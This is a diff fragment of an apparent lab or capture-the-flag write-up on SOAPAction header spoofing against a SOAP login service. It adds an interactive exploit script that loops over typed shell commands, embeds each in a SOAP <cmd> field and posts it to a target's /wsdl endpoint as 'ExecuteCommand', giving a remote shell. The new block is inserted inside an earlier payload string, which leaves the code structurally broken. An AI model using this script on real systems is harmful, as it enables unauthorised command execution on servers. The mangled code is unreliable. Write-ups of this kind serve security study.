@@ -136,6 +136,7 @@ If the server only checks the SOAPAction header, it may be possible to spoof a r
 
 **1. Normal Request (Blocked)**
 
+```python
 import requests
 
 payload = '''<?xml version="1.0" encoding="utf-8"?>
@@ -172,6 +173,28 @@ payload = '''<?xml version="1.0" encoding="utf-8"?>
       <cmd>whoami</cmd>
     </LoginRequest>
   </soap:Body>
+
+3.Interactive Exploit Script
+
+import requests
+
+while True:
+    cmd = input("$ ")
+    payload = f'''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+  xmlns:tns="http://tempuri.org/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <cmd>{cmd}</cmd>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'''
+    r = requests.post(
+        "http://<TARGET IP>:3002/wsdl",
+        data=payload,
+        headers={"SOAPAction": '"ExecuteCommand"'}
+    )
+    print(r.content)
 </soap:Envelope>'''
 
 <pre>print(requests.post(
